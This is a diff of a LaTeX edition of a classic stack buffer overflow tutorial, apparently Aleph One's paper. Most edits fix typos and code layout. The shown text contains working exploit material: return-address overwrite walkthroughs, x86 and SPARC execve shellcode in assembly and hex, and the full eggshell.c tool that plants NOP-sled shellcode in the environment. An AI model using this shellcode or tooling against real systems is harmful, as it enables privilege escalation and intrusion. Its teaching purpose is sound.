@@ -290,8 +290,8 @@ stack                                        stack
 \end{verbatim}
 }
 What is going on here? Why do we get a segmentation violation? Simple. strcpy() is copying the contents of  
-\verb+*str (larger_string[])+ into buffer[] until a null character  is found on the string. As we can see buffer[] is much 
-smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means t hat all 250 
+*str (\verb+larger_string[])+ into buffer[] until a null character  is found on the string. As we can see buffer[] is much 
+smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means that all 250 
 [240] bytes after buffer in the stack are being o verwritten. This includes the SFP, RET, and even *str! We had 
 filled \verb+large_string+ with the character 'A'. It's hex character value is 0x41. That means that the return 
 address is now 0x41414141. This is outside of the process address space.  That is why when the function returns 
@@ -313,7 +313,7 @@ Lets try to modify our first example so that it overwrites the return address, a
 it execute arbitrary code. Just before buffer1[] on the stack is SFP, and before it, the return address. That is 4 
 bytes pass the end of buff er1[]. But remember that buffer1[] is real ly 2 word so its 8 bytes long. So the return 
 address is 12 bytes from the start of buffer1[]. We'll modify the return value in such a way that the assignment 
-statement 'x = 1;' after the function call wil l be jumped. To do so we add 8 bytes to the return address. 
+statement 'x = 1;' after the function call will be jumped. To do so we add 8 bytes to the return address. 
 Our code is now: example3.c:
 
 \begin{lstlisting}
@@ -383,7 +383,7 @@ Dump of assembler code for function main:
 \end{verbatim}
 }
 
-We can see that when calling function() the RET wil l be 0x8004a8, and we want to jump past the assignment at 
+We can see that when calling function() the RET will be 0x8004a8, and we want to jump past the assignment at 
 0x80004ab. The next instruction we want to execute is the at 0x8004b2. A little math tells us the distance is 8 
 bytes [should be 10]. 
 
@@ -427,8 +427,8 @@ void main()
 }
 \end{lstlisting}
 
-To find out what it l ooks like in assembly we compile it, and start up gdb. Remember to use the  static flag. 
-Otherwise the actual code  for the execve system call wil l not be included. Instead there wil l be a reference to 
+To find out what it looks like in assembly we compile it, and start up gdb. Remember to use the  static flag. 
+Otherwise the actual code  for the execve system call will not be included. Instead there will be a reference to 
 dynamic C library that would normally would be linked in at load time. 
 
 {\small
@@ -502,9 +502,9 @@ Lets try to understand what is going on here.  We'll start by studying main:
 0x8000133 : subl $0x8,%esp
 \end{verbatim}
 
-This is the procedure pre lude. It first saves the old frame pointer, makes the current stack pointer the new frame 
+This is the procedure prelude. It first saves the old frame pointer, makes the current stack pointer the new frame 
 pointer, and leaves space for the local variables. In this case its: char *name[2]; or 2 pointers to a char. Pointers 
-are a word long, so it lea ves space for two words (8 bytes).
+are a word long, so it leaves space for two words (8 bytes).
 
 \begin{verbatim}
 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)
@@ -966,7 +966,7 @@ exit
 
 What we have done above is filled the array \verb+large_string[]+ with the address of buffer[], which is where our code 
 will be. Then we copy our shellcode into the beginning of the \verb+large_string+ string. strcpy() will then copy 
-\verb+large_string+ onto buffer without doing any bounds checking, and wil l overflow the return address, overwriting it 
+\verb+large_string+ onto buffer without doing any bounds checking, and will overflow the return address, overwriting it 
 with the address where our code  is now located.  Once we reach the end of main and it tr ied to return it jumps to 
 our code, and execs a shell. The problem we are faced when trying to overflow the buffer of another program is 
 trying to figure out at what address the buffer (and thus our code) will be. The answer is that for every program 
@@ -1234,7 +1234,7 @@ Eureka! Less than a dozen tries and we found the magic numbers. If xterm were in
 now be a root shell. 
 
 \subsection{Small Buffer Overflows}
-There wil l be times when  the buffer you are trying to overflow is so small that either the shellcode wont fit into 
+There will be times when  the buffer you are trying to overflow is so small that either the shellcode wont fit into 
 it, and it will overwrite the return address with instructions instead of the address of our code, or the number of 
 NOPs you can pad the front of the string with is so small that the chances of guessing their address is 
 minuscule. To obtain a shell from these programs we will have to go about it another way. This particular 
@@ -1414,77 +1414,43 @@ call   -0x24
 .string \"/bin/sh\"
 \end{lstlisting}
 
-     
 
-\begin{comment}
-SPARC/Solaris
-
+\begin{lstlisting}[caption=SPARC/Solaris]
 sethi   0xbd89a, %l6
-
 or      %l6, 0x16e, %l6
-
 sethi   0xbdcda, %l7
-
 and     %sp, %sp, %o0
-
 add     %sp, 8, %o1
-
 xor     %o2, %o2, %o2
-
 add     %sp, 16, %sp
-
 std     %l6, [%sp - 16]
-
 st      %sp, [%sp - 8]
-
 st      %g0, [%sp - 4]
-
 mov     0x3b, %g1
-
 ta      8
-
 xor     %o7, %o7, %o0
-
 mov     1, %g1
-
 ta      8
+\end{lstlisting}
 
-     
-
-SPARC/SunOS
-
+\begin{lstlisting}[caption=SPARC/SunOS]
 sethi   0xbd89a, %l6
-
 or      %l6, 0x16e, %l6
-
 sethi   0xbdcda, %l7
-
 and     %sp, %sp, %o0
-
 add     %sp, 8, %o1
-
 xor     %o2, %o2, %o2
-
 add     %sp, 16, %sp
-
 std     %l6, [%sp - 16]
-
 st      %sp, [%sp - 8]
-
 st      %g0, [%sp - 4]
-
 mov     0x3b, %g1
-
 mov     -0x1, %l5
-
 ta      %l5 + 1
-
 xor     %o7, %o7, %o0
-
 mov     1, %g1
-
 ta      %l5 + 1
-\end{comment}
+\end{lstlisting}
 
 %Appendix B - Generic Buffer Overflow Program
 \section{Generic Buffer Overflow Program}
@@ -1493,65 +1459,59 @@ ta      %l5 + 1
 
 \begin{lstlisting}[caption=shellcode.h]
 #if defined(__i386__) && defined(__linux__)
-
 #define NOP_SIZE        1
-
 char nop[] = "\x90";
-
 char shellcode[] =
-
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88"
+  "\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
+  "\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-unsigned long get_sp(void) {
-
+unsigned long get_sp(void) 
+{
    __asm__("movl %esp,%eax");
-
 }
 
-#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
-
-#define NOP_SIZE        4char nop[]="\xac\x15\xa1\x6e";
-
-char shellcode[] =
-
-  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
-
-  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
-
-  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
-
-  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
-
-unsigned long get_sp(void) {
-
-  __asm__("or %sp, %sp, %i0");
-
-}
-
-#elif defined(__sparc__) && defined(__sun__)
+#elif defined(__sparc__) && defined(__sun__) && \
+        defined(__svr4__)
 
 #define NOP_SIZE        4
 
 char nop[]="\xac\x15\xa1\x6e";
 
 char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f"
+  "\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c"
+  "\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82"
+  "\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
 
-  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
-
-  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
-
-  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
-
-  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
-
-unsigned long get_sp(void) {
-
+unsigned long get_sp(void) 
+{
   __asm__("or %sp, %sp, %i0");
+}
 
+#elif defined(__sparc__) && defined(__sun__)
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f"
+  "\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c"
+  "\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82"
+  "\x10\x20\x3b\xaa\x10\x3f\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82"
+  "\x10\x20\x01\x91\xd5\x60\x01";
+
+unsigned long get_sp(void) 
+{
+  __asm__("or %sp, %sp, %i0");
 }
 
 #endif
@@ -1559,151 +1519,100 @@ unsigned long get_sp(void) {
 
 %eggshell.c
 \begin{lstlisting}[caption=eggshell.c]
-
 /*
-
  * eggshell v1.0
-
  *
-
  * Aleph One / aleph1@underground.org
-
  */
 
 #include 
-
 #include stdio.h
-
 #include "shellcode.h"
-
 #define DEFAULT_OFFSET                    0
-
 #define DEFAULT_BUFFER_SIZE             512
-
 #define DEFAULT_EGG_SIZE               2048
 
 void usage(void);
 
-void main(int argc, char *argv[]) {
-
+void main(int argc, char *argv[]) 
+{
   char *ptr, *bof, *egg;
-
   long *addr_ptr, addr;
-
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-
   int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;
 
   while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
-
-    switch (c) {
-
+    switch (c) 
+    {
       case 'a':
-
         align = atoi(optarg);
-
         break;
-
       case 'b':
-
         bsize = atoi(optarg);
-
         break;      case 'e':
-
         eggsize = atoi(optarg);
-
         break;
-
       case 'o':
-
         offset = atoi(optarg);
-
         break;
-
       case '?':
-
         usage();
-
         exit(0);
-
     }
 
-  if (strlen(shellcode) > eggsize) {
-
+  if (strlen(shellcode) > eggsize) 
+  {
     printf("Shellcode is larger the the egg.\n");
-
     exit(0);
-
   }
 
-  if (!(bof = malloc(bsize))) {
-
+  if (!(bof = malloc(bsize))) 
+  {
     printf("Can't allocate memory.\n");
-
     exit(0);
-
   }
 
-  if (!(egg = malloc(eggsize))) {
-
+  if (!(egg = malloc(eggsize))) 
+  {
     printf("Can't allocate memory.\n");
-
     exit(0);
-
   }
 
   addr = get_sp() - offset;
 
   printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
-
     bsize, eggsize, align);
 
   printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
-
   addr_ptr = (long *) bof;
 
   for (i = 0; i < bsize; i+=4)
-
     *(addr_ptr++) = addr;
 
   ptr = egg;
-
   for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
-
-    for (n = 0; n < NOP_SIZE; n++) {
-
+    for (n = 0; n < NOP_SIZE; n++) 
+    {
       m = (n + align) % NOP_SIZE;
-
       *(ptr++) = nop[m];
-
     }
 
   for (i = 0; i < strlen(shellcode); i++)
-
     *(ptr++) = shellcode[i];
 
   bof[bsize - 1] = '\0';
-
   egg[eggsize - 1] = '\0';
-
   memcpy(egg,"EGG=",4);
-
   putenv(egg);
-
   memcpy(bof,"BOF=",4);
-
   putenv(bof);
-
   system("/bin/sh");
-
 }
 
-void usage(void) {
-
+void usage(void) 
+{
   (void)fprintf(stderr,
-
     "usage: eggshell [-a ] [-b ] [-e ] [-o ]\n");
-
 }
 \end{lstlisting}
 
